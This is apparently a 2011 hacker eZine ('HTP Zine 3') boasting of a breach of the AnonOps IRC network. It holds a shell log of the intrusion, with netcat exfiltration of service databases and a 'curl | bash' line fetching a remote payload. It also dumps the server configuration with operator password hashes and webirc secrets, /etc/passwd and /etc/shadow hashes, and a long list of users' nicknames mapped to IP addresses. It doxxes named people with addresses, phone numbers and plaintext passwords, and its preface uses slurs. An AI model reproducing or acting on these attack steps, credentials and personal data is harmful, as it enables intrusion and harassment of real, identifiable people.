Email: tlyon () netonecom net
Email2: fxrocker () gmail com
Phone: 231-734-6144
http://www.netonecom.net
http://photobucket.com/home/molkmin <<< molkmin:sotw1btn
http://twitter.com/#!/molkmin <<< molkmin:sotw1btn


Pottsi
Name: Ian Potts
Age: 24
Location: Manchester, UK
NickServ: pottsi:digger
Email: pottsi () pottsi com
Email2: ian1potts () aol com
Email3: iantom90 () hotmail co uk
http://pottsi.com/
http://www.myspace.com/56242380


Sindacious
Name: James Clifton Newton
Age: 19
DOB: 05/06/1992
Address: 1506 Jenks Ave Panama City, FL 32405
Oper: sindacious:284adflgy343
Phone: 785-746-0322, 850-215-2518
Email: admin () SinIRC net
http://sindacio.us/
http://www.sindacious.com (It just redirects to sindacio.us)
http://twitter.com/sindacious

:: 0x07 - exit ::

            K1LL Th3 G1b50n!


attachm3nts >>>

n3t0nec0m shad0ws
m1rr0r 1: http://www.mediafire.com/file/mdlc4wibpacevv6/swshadow
m1rr0r 2: http://www.2shared.com/file/Axzg1umn/swshadow.html

w1k1 pass3s
m1rr0r 1: http://www.mediafire.com/?s9c9jtns5tp8oux
m1rr0r 2: http://www.2shared.com/file/pAg2gqyb/mibbitwiki.html

n1cks3rv pass3s
m1rr0r 1: http://www.mediafire.com/?g8hpr34ssu1ssdq
m1rr0r 2: http://www.2shared.com/document/TLTX8j3E/fullnspassdump.html

pMs
m1rr0r 1: http://www.2shared.com/file/Eq3cyC7f/mibbitpms.html
m1rr0r 2: http://tools.mibbit.com/mibbitpms.out :PppPpPPPPppppppp

cHaN msGs
http://www.2shared.com/file/5Kf08Z3-/mibbitchanmsgs.html


root () tools:~# wall <<< ""E0F""
                                                                               
Broadcast Message from root () tools                                              
        (/dev/pts/3) at [redacted] ...                                         
                                                                               
E0F"
Papers,Hack The Planet (HTP) Zine 3,eZine,,2011-11-15,: N/A,"888    888        d8888  .d8888b.  888    d8P  
888    888       d88888 d88P  Y88b 888   d8P  
888    888      d88P888 888    888 888  d8P    
8888888888     d88P 888 888        888d88K    
888    888    d88P  888 888        8888888b    
888    888   d88P   888 888    888 888  Y88b  
888    888  d8888888888 Y88b  d88P 888   Y88b  
888    888 d88P     888  ""Y8888P""  888    Y88b
                             _____          
8888888888 888           ,-:` \;',`'-
888        888         .'-;_,;  ':-;_,'.
888        888        /;   '/    ,  _`.-\
8888888    888       | '`. (`     /` ` \`|
888        888       |:.  `\`-.   \_   / |
888        888       |     (   `,  .`\ ;'|
888        888        \     | .'     `-'/
8888888888 88888888    `.   ;/        .'
                         `'-._____.-'`
                                     
8888888b.  888             d8888 888b    888 8888888888 88888888888        d8888
888   Y88b 888            d88888 8888b   888 888            888           d88888
888    888 888           d88P888 88888b  888 888            888          d88P888
888   d88P 888          d88P 888 888Y88b 888 8888888        888         d88P 888
8888888P""  888         d88P  888 888 Y88b888 888            888        d88P  888
888        888        d88P   888 888  Y88888 888            888       d88P   888
888        888       d8888888888 888   Y8888 888            888      d8888888888
888        88888888 d88P     888 888    Y888 8888888888     888     d88P     888
                <shitstorm> lol who the fuck is carlos
                              CARLOS1337
                               PRESENTE
                          LOL ANONOPS MUERTO
                           CERO DIA EDICION
            
 ┌─────────────────────────┐
 │ :: Table of Contents :: │
 ├─────────────────────────┤
 │ 0x01 ~ Prefac3          │
 ├─────────────────────────┤
 │ 0x02 ~ s3rv1c3s pwn     │
 ├─────────────────────────┤
 │ 0x03 ~ iRCd pwn         │
 ├─────────────────────────┤
 │ 0x04 ~ b0x pwn          │
 ├─────────────────────────┤
 │ 0x05 ~ 1ps              │
 ├─────────────────────────┤
 │ 0x06 ~ l0l sh1t         │
 ├─────────────────────────┤
 │ 0x07 ~ FiL3z            │
 ├─────────────────────────┤
 │ 0x08 ~ ex1t             │
 └─────────────────────────┘

                            :: 0x01 - Prefac3 ::
            
    Over the course of the following months, it has become very clear to us that
AnonOps no longer stands for the values of open speech, freedom of opinion and
has instead transformed itself into a network rampent with trolls, abusive
channel operators, and a generally unwelcoming place for those whom wish to
communicate and gather to fight the powers of corruption, and those whom wish
to censor our open internet. Various attempts have been made in the past to
course correct AnonOps, but the totalitarian IRC operator regime has remained
intact.
    The AnonOps network prides itself in being ""secure"", however, such is not
the case. Rather, they employ incompetent and highly unprofessional channel and 
IRC operators, allowing their personal grudges to interfere with the operation
of a secure network for Anonymous. Newcomers to the network are welcomed by a
spirit of condescention and arrogance, as any legitimate question or concern is
slowly drowned out by the laughter of the senior members of the chatroom.
Channel operators rather than discourage such behavior, applaud it, joining in,
and using their powers to kick, ban, or SAJOIN newcomers to #kill. Any attempt
to speak out against the way the network is ran is met with kick, ban, or zline.
A decentralized organization such as Anonymous cannot thrive on a network ran by
such people as Power2All, Wolfy, Owen and Shitstorm. Anonymous transcends beyond
one IRC network, or one social medium. Spread. Be aware. Educate. Anonymous is
an idea; ideas are bulletproof. 
    Anonymous cannot be owned or controlled by a small group of faggot
totaltarian operators. Thus we have decided to lombotomize the cancer that is
AnonOps from the internet. AnonOps no longer stands with Anonymous, but rather
against us as an agent of censorship, unlulzy pseudo-activism and immense
faggotry, and thus must be eliminated. 
    AnonOps has proven itself insecure and fault prone in the past. We are here
to illustrate these points again. AnonOps is NOT Anonymous, and throughtheir
actions, they have proven themselves against our ideals. Welcome to thecourt of
the internet, AnonOps. You shall be persecuted for your crimes against the
freedom of chats, your utter and repeated failure as an IRC network, your aid to
the spread of namefagging, and your gross negligence in securing the identities
of those whom chat and remain Anonymous on your network. 
    AnonOps has shown time and time again it is too large of a target, and very
well capable of corrupting the ideals which fuels the fight in every Anon.
As long as AnonOps stay online, they will continue to adulterate our cause,
bastardizing ideals of Anonymous, and running a network where the only lulz to
be had are that of the failures whom chat there and run the network. Such
activity cannot continue. 

Let's drop the formalities now, and get down to business!

                        :: 0x02 - s3rv1c3s pwn ::
                 ¡HOLA! ¡CARLOS1337 AQUI CON UN NUEVO ZINE!
        ~~~ JAJA ANONOPS ESTOY MUERTO: ¡AY CARAMBA! ¡UNA CERO DIA! ~~~

After probing AnonOps for quite a while, we figured out that they were using
a vulnerable version of Anope IRC Services. With a bit of luck, and an in house
zero day we were able to get ourselves a reverse shell.

 connect to [REDACTED] from 46.182.105.86 38604
[anonops@ns1 ~]$ id
uid=502(anonops) gid=502(anonops) groups=502(anonops)

# Let's go ahead and snag ourselves some juicy files... 
[anonops@ns1 ~]$ cd ~/inspircd/run/conf
[anonops@ns1 conf]$ nc htp 443 < inspircd.conf
[anonops@ns1 conf]$ cd ~/services
[anonops@ns1 services]$ nc htp 443 < nick.db
[anonops@ns1 services]$ nc htp 443 < chan.db
[anonops@ns1 services]$ nc htp 443 < oper.db
[anonops@ns1 services]$ nc htp 443 < os_info.db

# And then let's go ahead and hook services.
[anonops@ns1 services]$ curl http://secret.hep.cc/lol.sh | bash >/dev/null 2>&1
[anonops@ns1 services]$ killall services; ./services; exit


                         :: 0x02 - iRCd pwn ::
                              ¡Dios Mios!

<admin name=""AnonOps"" nick=""AnonOps"" email=""AnonOpsNetwork@gmail.com"">

<power hash=""sha256""
    diepass=""62b0ddb2bda9dd3cd239f6ae21c88ef13d2e70d27e0f79fbf88be0f1575ed8fb""
    restartpass=""ca985667598484ddf516e3b2f445491b4c31e82963422dd07d305bcc4d24ff65"">

<connect name=""localhost"" allow=""127.0.0.0/8"" timeout=""90"" pingfreq=""120""
    hardsendq=""786432"" softsendq=""8192"" recvq=""8192"" threshold=""10""
    commandrate=""1000"" fakelag=""on"" globalmax=""1000"" useident=""no"" limit=""5000""
    modes=""+xiw"">
    
<connect name=""vpn"" allow=""46.236.2.47"" timeout=""40"" pingfreq=""120""
    hardsendq=""786432"" softsendq=""8192"" recvq=""8192"" threshold=""10""
    commandrate=""1000"" fakelag=""on"" localmax=""10"" globalmax=""10"" useident=""no""
    modes=""+xiw"">

<connect name=""mibbit1"" allow=""64.62.228.82"" timeout=""40"" pingfreq=""120""
    hardsendq=""131074"" recvq=""4096"" threshold=""5"" fakelag=""on"" localmax=""5000""
    globalmax=""5000"" useident=""no"" modes=""+xwi"">
<connect name=""mibbit2"" allow=""207.192.75.252"" timeout=""40"" pingfreq=""120""
    hardsendq=""131074"" recvq=""4096"" threshold=""5"" fakelag=""on"" localmax=""5000""
    globalmax=""5000"" useident=""no"" modes=""+wxi"">
<connect name=""mibbit3"" allow=""78.129.202.38"" timeout=""40"" pingfreq=""120""
    hardsendq=""131074"" recvq=""4096"" threshold=""5"" fakelag=""on"" localmax=""5000""
    globalmax=""5000"" useident=""no"" modes=""+wxi"">
<connect name=""mibbit4"" allow=""109.169.29.95"" timeout=""40"" pingfreq=""120""
hardsendq=""131074"" recvq=""4096"" threshold=""5"" fakelag=""on"" localmax=""5000""
    globalmax=""5000"" useident=""no"" modes=""+wxi"">

<connect name=""main"" allow=""*"" timeout=""10"" pingfreq=""120"" hardsendq=""786432""
    softsendq=""8192"" recvq=""8192"" threshold=""10"" commandrate=""1000"" fakelag=""on""
    localmax=""2"" globalmax=""3"" useident=""no"" limit=""5000"" modes=""+xiw"">
    
<cidr ipv4clone=""32"" ipv6clone=""128"">
<channels users=""50"" opers=""100"">
<banlist chan=""*"" limit=""128"">
<options prefixquit=""Quit: "" suffixquit="""" prefixpart="""" suffixpart=""""
    fixedquit="""" fixedpart="""" syntaxhints=""no"" cyclehosts=""no""
    cyclehostsfromuser=""no"" ircumsgprefix=""no"" announcets=""no""
    allowmismatched=""no"" defaultbind=""auto"" hostintopic=""no"" pingwarning=""15""
    serverpingfreq=""300"" defaultmodes=""nt"" exemptchanops=""NcBS""
    invitebypassmodes=""no"">
<performance netbuffersize=""10240"" maxwho=""20"" somaxconn=""128"" softlimit=""1024""
    quietbursts=""yes"" nouserdns=""no"">
<security announceinvites=""dynamic"" hideulines=""yes"" flatlinks=""yes""
    hidewhois=""AnonOps"" hidebans=""yes"" hidekills=""Killer"" hidesplits=""yes""
    maxtargets=""20"" customversion=""AnonOpsIRC"" operspywhois=""yes""
    restrictbannedusers=""yes"" genericoper=""yes"" userstats="""">
<limits maxnick=""31"" maxchan=""31"" maxmodes=""20"" maxident=""11"" maxquit=""100""
    maxtopic=""307"" maxkick=""150"" maxgecos=""30"" maxaway=""30"">
<whowas groupsize=""3"" maxgroups=""5000"" maxkeep=""3d"">
<insane hostmasks=""yes"" ipmasks=""yes"" nickmasks=""yes"" trigger=""75"">

<badnick nick=""ChanServ"" reason=""Reserved For Services"">
<badnick nick=""NickServ"" reason=""Reserved For Services"">
<badnick nick=""OperServ"" reason=""Reserved For Services"">
<badnick nick=""MemoServ"" reason=""Reserved For Services"">
<badnick nick=""BotServ"" reason=""Reserved For Services"">
<badnick nick=""vHostServ"" reason=""Reserved For Services"">
<badhost host=""IRCLOIC@*"" reason=""wrong server"">

<uline server=""services.anonops.in"" silent=""yes"">
<uline server=""defender.anonops.in"" silent=""yes"">

# Oper Classes
<class name=""Root""
    commands=""DIE RESTART RSQUIT JUMPSERVER LOCKSERV UNLOCKSERV SQUIT
    GRELOADMODULE CLEARCACHE"">
<class name=""Shutdown"" commands=""REHASH LOADMODULE UNLOADMODULE RELOAD
    GLOADMODULE GUNLOADMODULE SQUIT""
    privs=""users/auspex channels/auspex servers/auspex users/mass-message
    channels/high-join-limit channels/set-permanent users/flood/no-throttle
    users/flood/increased-buffers"" usermodes=""*"" chanmodes=""*"">
<class name=""ServerLink"" commands=""CONNECT RCONNECT MKPASSWD ALLTIME SWHOIS
    CLOSE TAXONOMY"" usermodes=""*"" chanmodes=""*"" privs=""servers/auspex"">
<class name=""BanControl"" commands=""KILL GLINE KLINE ZLINE QLINE ELINE TLINE
    RLINE CHECK NICKLOCK NICKUNLOCK SHUN CLONES"" privs=""channels/auspex
    channels/high-join-limit"" usermodes=""*"" chanmodes=""*"">
<class name=""OperChat"" commands=""WALLOPS GLOBOPS SETIDLE"" usermodes=""*""
    chanmodes=""*"" privs=""users/mass-message"">
<class name=""HostCloak"" commands=""SETHOST SETIDENT SETNAME CHGHOST CHGIDENT
    CHECK CHGNAME"" usermodes=""*"" chanmodes=""*"">
<class name=""OperUnlag"" privs=""users/flood/no-throttle
    users/flood/increased-buffers"">
<class name=""ServAdmin"" commands=""SAMODE SAJOIN SAPART SANICK SAQUIT SATOPIC
    OJOIN FILTER CBAN"">

# Oper Types
<type name=""RootAdmin"" classes=""Root Shutdown ServerLink BanControl OperChat
    HostCloak OperUnlag ServAdmin"" vhost=""netadmin.anonops.li""
    override=""INVITE KEY LIMIT KICK MODEOP MODEDEOP MODEVOICE MODEDEVOICE
    MODEHALFOP MODEDEHALFOP OTHERMODE TOPIC BANWALK"">
<type name=""NetAdmin"" classes=""OperChat BanControl HostCloak Shutdown
    ServerLink OperUnlag ServAdmin"" vhost=""netadmin.anonops.li""
    override=""INVITE KEY LIMIT KICK MODEOP MODEDEOP MODEVOICE MODEDEVOICE
    MODEHALFOP MODEDEHALFOP OTHERMODE TOPIC"">
<type name=""GlobalOp"" classes=""OperChat HostCloak BanControl OperUnlag ServerLink""
    vhost=""ircop.anonops.in"" override=""KICK MODEOP MODEDEOP MODEVOICE
    MODEDEVOICE MODEHALFOP MODEDEHALFOP"">
<type name=""Helper"" classes=""HostCloak"" vhost=""helper.anonops.in"">
<type name=""ServicesAdmin"" classes=""OperChat HostCloak OperUnlag BanControl
    ServerLink Shutdown"" vhost=""servadmin.anonops.li""
    override=""INVITE KEY LIMIT KICK MODEOP MODEDEOP MODEVOICE MODEDEVOICE
    MODEHALFOP MODEDEHALFOP OTHERMODE TOPIC"">

# Oper List
<oper name=""power2all"" hash=""sha256""
    password=""e6275286066acd1939ee617fd8481903b5de5b3573d00835481db7024f8cc488""
    host=""*@*"" vhost=""staff.anonops.li"" type=""RootAdmin"">
<oper name=""Cody"" hash=""sha256""
    password=""1698c6b760f79d808b27dc8d2605acafbbf53cdf78d3603a0883b8df2f483b9f""
    host=""*@*"" vhost=""staff.anonops.li"" type=""NetAdmin"">
<oper name=""pi"" hash=""sha256""
    password=""c12c6c10bfe35d2facfede647fb6651ea0074660d17ee3af3bd7831d087d44ce""
    host=""*@*"" vhost=""anonops.staff"" type=""RootAdmin"">
<oper name=""p0ke"" hash=""sha256""
    password=""a214007b665299c451106a9ea16687ec845d9131646de9099521d34065d98ac6""
    host=""*@*"" vhost=""staff.anonops.li"" type=""NetAdmin"">
<oper name=""jaychow"" hash=""sha256""
    password=""2037df642493897250048bb739d3237c11aabb48e4e00dfa9f75dc163bda1742""
    host=""*@*"" vhost=""staff.anonops.li"" type=""NetAdmin"">
<oper name=""shitstorm"" hash=""sha256""
    password=""1eba91646d70e6634e3014a3167c6e0efa3a2809472645711d8306b787322821""
    host=""*@*"" vhost=""staff.anonops.li"" type=""RootAdmin"">
#<oper name=""Isis"" hash=""sha256""
#   password=""61f317d24a98796f28c387c0db5cebe475cd5dcd67963e68fafabc22d79636b7""
#   host=""*@*"" vhost=""staff.anonops.li"" type=""NetAdmin"">
#<oper name=""Nerdo"" hash=""sha256""
#   password=""7bbc72b57333b8f4dbbab0d88847e2f25d6cd5926876b0fad07db2469151e046""
#   host=""*@*"" vhost=""staff.anonops.li"" type=""RootAdmin"">
<oper name=""evilworks"" hash=""sha256""
    password=""8a6d07285f406fb3c894c30545ef9514cd3056b6316dd016e0365c43de7e6b7b""
    host=""*@*"" vhost=""staff.anonops.li"" type=""NetAdmin"">
<oper name=""Jupiler"" hash=""sha256""
    password=""96803102354be6a01acfd47e62eb0eace11fa6aff44e20fc94afe9244f4038a3""
    host=""*@*"" vhost=""staff.anonops.li"" type=""NetAdmin"">
#<oper name=""sharpie"" hash=""sha256""
#   password=""24dd9c6aab6e116fbb62f9aa5cba78ccd0b9852c929064e5ae07cebd29a20db7""
#   host=""*@*"" vhost=""staff.anonops.li"" type=""NetAdmin"">
<oper name=""daboogieman"" hash=""sha256""
    password=""0e3b8fa38cfae600196897531e5b1b96059c6041b9ad68eec1ba0ed91a1d6027""
    host=""*@*"" vhost=""staff.anonops.li"" type=""NetAdmin"">
<oper name=""pie"" hash=""sha256""
    password=""5bc4d814c4ed162f2cea2a40ffb156f2cac198ddf24316a2de6e3614cc892461""
    host=""*@*"" vhost=""staff.anonops.li"" type=""NetAdmin"">

# Default Modules Configs
<module name=""m_md5.so"">
<module name=""m_sha256.so"">
<module name=""m_ripemd160.so"">

<module name=""m_alias.so"">
<alias text=""NICKSERV"" replace=""PRIVMSG NickServ :$2-"" requires=""NickServ""
    uline=""yes"">
<alias text=""CHANSERV"" replace=""PRIVMSG ChanServ :$2-"" requires=""ChanServ""
    uline=""yes"">
<alias text=""OPERSERV"" replace=""PRIVMSG OperServ :$2-"" requires=""OperServ""
    uline=""yes"" operonly=""yes"">
<alias text=""BOTSERV"" replace=""PRIVMSG BotServ :$2-"" requires=""BotServ""
    uline=""yes"">
<alias text=""HOSTSERV"" replace=""PRIVMSG HostServ :$2-"" requires=""HostServ""
    uline=""yes"">
<alias text=""MEMOSERV"" replace=""PRIVMSG MemoServ :$2-"" requires=""MemoServ""
    uline=""yes"">
<alias text=""NS"" replace=""PRIVMSG NickServ :$2-"" requires=""NickServ"" uline=""yes"">
<alias text=""CS"" replace=""PRIVMSG ChanServ :$2-"" requires=""ChanServ"" uline=""yes"">
<alias text=""OS"" replace=""PRIVMSG OperServ :$2-"" requires=""OperServ"" uline=""yes""
    operonly=""yes"">
<alias text=""BS"" replace=""PRIVMSG BotServ :$2-"" requires=""BotServ"" uline=""yes"">
<alias text=""HS"" replace=""PRIVMSG HostServ :$2-"" requires=""HostServ"" uline=""yes"">
<alias text=""MS"" replace=""PRIVMSG MemoServ :$2-"" requires=""MemoServ"" uline=""yes"">
<alias text=""IDENTIFY"" replace=""PRIVMSG NickServ :IDENTIFY $2"" requires=""NickServ""
    uline=""yes"">

<module name=""m_allowinvite.so"">
<module name=""m_alltime.so"">
<module name=""m_auditorium.so"">
<auditorium opvisible=""no"" opcansee=""yes"" opercansee=""yes"">
<module name=""m_blockcolor.so"">
<module name=""m_botmode.so"">
<module name=""m_callerid.so"">
<callerid maxaccepts=""16"" operoverride=""yes"" tracknick=""no"" cooldown=""120"">
<module name=""m_chancreate.so"">
<module name=""m_chanprotect.so"">
<chanprotect noservices=""no"" qprefix=""~"" aprefix=""&"" deprotectself=""yes""
    deprotectothers=""yes"">
<module name=""m_check.so"">
<module name=""m_chghost.so"">
<module name=""m_chgident.so"">
<module name=""m_chgname.so"">
<module name=""m_cloaking.so"">
<cloak mode=""full"" key=""bubrafuKuWazunustFrUvacuvezawrU4rEgu"" prefix=""AN-"">
<module name=""m_close.so"">
<module name=""m_clones.so"">
<module name=""m_conn_umodes.so"">
#<module name=""m_connectban.so"">
#<connectban threshold=""4"" duration=""10m"" ipv4cidr=""32"" ipv6cidr=""128"">
<module name=""m_dccallow.so"">
<dccallow blockchat=""yes"" length=""0"" action=""block"">
<banfile pattern=""*"" action=""block"">
<module name=""m_delayjoin.so"">
<module name=""m_devoice.so"">
<module name=""m_dnsbl.so"">
<dnsbl name=""DroneBL"" type=""bitmask"" domain=""dnsbl.dronebl.org"" action=""ZLINE""
    reason=""DroneBL"" duration=""30d"" bitmask=""253"">
<dnsbl name=""ProxyBL"" type=""bitmask"" domain=""dnsbl.proxybl.org"" action=""ZLINE""
    reason=""ProxyBL"" duration=""30d"" bitmask=""253"">
<dnsbl name=""efnetRBL"" type=""bitmask"" domain=""rbl.efnet.org"" action=""ZLINE""
    reason=""EFnetRBL"" duration=""30d"" bitmask=""253"">
<module name=""m_filter.so"">
<filteropts engine=""pcre"">
<module name=""m_globalload.so"">
<module name=""m_globops.so"">
<module name=""m_halfop.so"">
<module name=""m_hidechans.so"">
<hidechans affectsopers=""false"">
<module name=""m_hideoper.so"">
<module name=""m_inviteexception.so"">
<module name=""m_joinflood.so"">
<module name=""m_knock.so"">
<module name=""m_lockserv.so"">
<module name=""m_maphide.so"">
<module name=""m_messageflood.so"">
<module name=""m_muteban.so"">
<module name=""m_conn_waitpong.so"">
<waitpong sendsnotice=""yes"" killonbadreply=""no"">
<module name=""m_nickflood.so"">
<module name=""m_nicklock.so"">
<module name=""m_nonotice.so"">
<module name=""m_noctcp.so"">
<module name=""m_nokicks.so"">
<module name=""m_nonicks.so"">

#Oper modules
<module name=""m_operchans.so"">
<module name=""m_ojoin.so"">
<ojoin prefix="""" notice=""no"" op=""no"">
<module name=""m_operjoin.so"">
<operjoin channel=""#opers"" override=""no"">
<module name=""m_opermotd.so"">
<opermotd file=""oper.motd"" onoper=""yes"">
<module name=""m_override.so"">
<module name=""m_password_hash.so"">
<module name=""m_redirect.so"">
<module name=""m_regex_glob.so"">
<module name=""m_regex_posix.so"">
<module name=""m_regex_pcre.so"">
<module name=""m_regonlycreate.so"">
<module name=""m_rline.so"">
<module name=""m_sajoin.so"">
<module name=""m_sakick.so"">
<module name=""m_samode.so"">
<module name=""m_sanick.so"">
<module name=""m_sapart.so"">
<module name=""m_satopic.so"">
<module name=""m_securelist.so"">
<securehost exception=""*@*.searchirc.org"">
<securehost exception=""*@*.netsplit.de"">
<securehost exception=""*@bot.search.mibbit.com"">
<module name=""m_sethost.so"">
<module name=""m_setident.so"">
<module name=""m_setname.so"">
<module name=""m_seenicks.so"">
<module name=""m_services_account.so"">
<module name=""m_showwhois.so"">
<module name=""m_shun.so"">
<shun enabledcommands=""PING PONG QUIT PART"" notifyuser=""no"" affectopers=""no"">
<module name=""m_spanningtree.so"">
<module name=""m_sslmodes.so"">
<module name=""m_ssl_gnutls.so"">
<module name=""m_sslinfo.so"">
<module name=""m_stripcolor.so"">
<module name=""m_svshold.so"">
<module name=""m_swhois.so"">
<module name=""m_timedbans.so"">
<module name=""m_tline.so"">
#<module name=""m_xline_db.so"">

#Mibbit Blocks
<module name=""m_cgiirc.so"">
<cgihost type=""webirc"" password=""MaF6uSTadeTUcre52wuqU84UQ4p2u4RA""
    mask=""64.62.228.82"">
<cgihost type=""webirc"" password=""MaF6uSTadeTUcre52wuqU84UQ4p2u4RA""
    mask=""207.192.75.252""> 
<cgihost type=""webirc"" password=""MaF6uSTadeTUcre52wuqU84UQ4p2u4RA""
    mask=""78.129.202.38""> 
<cgihost type=""webirc"" password=""MaF6uSTadeTUcre52wuqU84UQ4p2u4RA""
    mask=""109.169.29.95""> 

# P0ke's WebIRC
<cgihost type=""webirc"" password=""gQhsUKatbEMPruwFqjm"" mask=""127.0.0.1"">


                        :: 0x04 - b0x pwn ::

[anonops@ns1 run]$ base64 utmp
[anonops@ns1 etc]$ cat passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
avahi:x:70:70:Avahi daemon:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
avahi-autoipd:x:100:102:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
shitstorm:x:500:500::/home/shitstorm:/bin/bash
anonops:x:501:501::/home/anonops:/bin/bash
owen:x:502:502::/home/owen:/bin/bash
ntp:x:38:38::/etc/ntp:/sbin/nologin

# IT GETS BETTER!
[anonops@ns1 ~]$ cat /etc/shadow | grep '\$'
root:$1$1wg7czx2$Twx4Tu6B/HhoPX4M/mCQF1:15292:0:99999:7:::
shitstorm:$1$S9rg0Dwq$cSt2nrpUetbUe4VLwpLFC1:15292:0:99999:7:::
anonops:$1$7BYkAp.7$cN4cPFCs3lXyLF19ifdUl/:15292:0:99999:7:::
owen:$1$mtzJIgPo$Vl5cLKMafgP1/2Sv8iWGi/:15292:0:99999:7:::

                    :: 0x05 ~ 1pS ::
                   
# These were posted on pastebin, but it didnt seem to get as much attention
# as whoever posted it wanted it to get. All these are from a vulnerable
# CGI:IRC which incompitence extra-ordinare Power2All assured everyone was safe.
# What a fucking idiot.

ANON555 97.104.251.171 cpe-97-104-251-171.cfl.res.rr.com
ANON_Darkness 184.154.116.156 singlehop1.securitykiss.com
ANONamy 86.189.5.32 host86-189-5-32.range86-189.btcentralplus.com
AfDTags 76.85.186.139 CPE-76-85-186-139.neb.res.rr.com
Anon23845 95.140.125.37 free-125-37.mediaworksit.net
AnonFin 194.110.178.3 mail2.paf.fi
AnonymousMe 69.130.46.124 h69-130-46-124.qrtzaz.dsl.dynamic.tds.net
Azrae 74.232.155.229 adsl-074-232-155-229.sip.asm.bellsouth.net
B2F 173.84.223.70
Billy_Mays 65.183.151.13 saito.countshockula.com 109.235.51.184 tor-exit-node1.freedomservice.onion
C0d3 76.0.7.183 mo-76-0-7-183.dhcp.embarqhsd.net
CaineOfBorg 173.3.247.193 ool-ad03f7c1.dyn.optonline.net
Caleb 94.75.255.118 hosted-by.leaseweb.com
DJ-TAM 76.226.135.59 adsl-76-226-135-59.dsl.sfldmi.sbcglobal.net
DubstepMagic 60.228.226.189 CPE-60-228-226-189.lns8.woo.bigpond.net.au
Edave22 68.9.122.7 ip68-9-122-7.ri.ri.cox.net
Epsilon 173.3.247.208 ool-ad03f7d0.dyn.optonline.net
FedX 114.39.102.162 114-39-102-162.dynamic.hinet.net
GlitchMC 174.124.43.61 174-124-43-61.dyn.centurytel.net
HIv 95.140.125.37 free-125-37.mediaworksit.net
Haze 12.18.245.219
Indianrubuk 122.174.160.44 ABTS-TN-dynamic-044.160.174.122.airtelbroadband.in
Inkk 108.18.106.240 pool-108-18-106-240.washdc.fios.verizon.net
Jincux 184.91.149.18 18.149.91.184.cfl.res.rr.com
Josss 78.228.41.61 sbg57-1-78-228-41-61.fbx.proxad.net
LOLOL 0.0.7.209
LTD 174.127.99.174 174.127.99.174.static.midphase.com
Lumina 186.188.228.113
M4C 201.96.104.241 customer-201-96-104-241.uninet-ide.com.mx
Odinaga 129.72.141.219 uwyo-129-72-141-219.uwyo.edu
Power2All 82.169.240.68 82-169-240-68.ip.telfort.nl
RetSnom 138.199.70.143
Ruffah_Ras 98.233.180.236 c-98-233-180-236.hsd1.md.comcast.net
ShadowOp 75.18.160.149 adsl-75-18-160-149.dsl.pltn13.sbcglobal.net
Smeryl 77.196.253.34 34.253.196.77.rev.sfr.net
Smeyl 77.196.253.34 34.253.196.77.rev.sfr.net
Swag 66.66.103.14 cpe-66-66-103-14.rochester.res.rr.com
Thismanisadoctor 24.20.65.109 c-24-20-65-109.hsd1.or.comcast.net
UNBANMEIMPORTANTSTUFF 24.167.16.4 cpe-24-167-16-4.rgv.res.rr.com
Xerath 60.231.48.85 CPE-60-231-48-85.lns3.cha.bigpond.net.au
anon123 187.146.160.236 dsl-187-146-160-236-dyn.prod-infinitum.com.mx
anon4347 75.149.43.213 fabgraphics.com
anonymama 75.157.157.14 d75-157-157-14.bchsia.telus.net
bobbbbbb 93.182.187.4 anon-187-4.vpn.ipredator.se
boho 173.23.64.22 173-23-64-22.client.mchsi.com
br4incr4sh 81.56.209.237 server.abcdeflorent.com
chippy1337LOL 93.182.130.66 anon-130-66.vpn.ipredator.se
cokee 93.182.133.20 anon-133-20.vpn.ipredator.se
cokeee 93.182.130.66 anon-130-66.vpn.ipredator.se
comx6 190.99.231.241 dsl-emcali-190.99.231.241.emcali.net.co
digger 0.0.0.2
don 196.206.85.193 adsl196-193-85-206-196.adsl196-3.iam.net.ma
dotprod 128.32.21.89 static-128-32-21-89.Law.Berkeley.EDU
e 209.212.149.109 za.l.to
eddie 166.250.1.233 233.sub-166-250-1.myvzw.com
elena197 88.104.229.97 88-104-229-97.dynamic.dsl.as9105.com
facePalmMe 128.32.21.89 static-128-32-21-89.Law.Berkeley.EDU
fuckfox 128.32.21.89 static-128-32-21-89.Law.Berkeley.EDU
g31g3r 137.238.147.205 s147n205.resnet.geneseo.edu
gaston 173.174.139.89 cpe-173-174-139-89.satx.res.rr.com
gawkcobbler 71.54.42.86 nc-71-54-42-86.dhcp.embarqhsd.net
gezwitscher 175.41.162.169 ec2-175-41-162-169.ap-southeast-1.compute.amazonaws.com
ghostcom 108.0.70.45 pool-108-0-70-45.lsanca.fios.verizon.net
hacker 68.45.41.140 c-68-45-41-140.hsd1.nj.comcast.net
heckl 68.68.108.159
imti 173.48.90.41 pool-173-48-90-41.bstnma.fios.verizon.net
k1tt3n 213.251.194.76
k3ymaster 173.245.64.95
koolz 98.203.26.25 c-98-203-26-25.hsd1.fl.comcast.net
lionymous 67.183.152.14 c-67-183-152-14.hsd1.wa.comcast.net
locky 186.86.129.1 Dynamic-IP-186861291.cable.net.co
